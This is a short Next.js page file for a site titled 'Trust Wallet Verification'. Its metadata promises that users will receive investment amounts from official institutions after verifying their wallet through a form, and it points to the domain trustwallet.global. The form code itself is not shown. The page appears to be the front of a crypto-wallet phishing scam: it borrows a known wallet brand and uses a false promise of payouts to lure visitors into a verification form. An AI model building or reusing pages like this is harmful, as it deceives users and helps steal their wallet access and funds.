// pages/index.tsx
import Head from 'next/head';
import Header from '../components/Header';
import Hero from '../components/Hero';
import About from '../components/About';
import Form from '../components/Form';
import Footer from '../components/Footer';

const Home: React.FC = () => {
  return (
    <>
      <Head>
        <title>Trust Wallet Verification</title>
        <meta name="description" content="Wallet verification form for receiving investment amounts from official institutions." />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta property="og:title" content="Trust Wallet Verification" />
        <meta property="og:description" content="Verify your wallet to receive investments from official institutions." />
        <meta property="og:image" content="/images/landing-image.png" />
        <meta property="og:url" content="https://trustwallet.global" />
        <meta name="twitter:card" content="summary_large_image" />
      </Head>
      <Header />
      <main className="pt-16">
        <Hero />
        <About />
        <Form />
      </main>
      <Footer />
    </>
  );
};

export default Home;
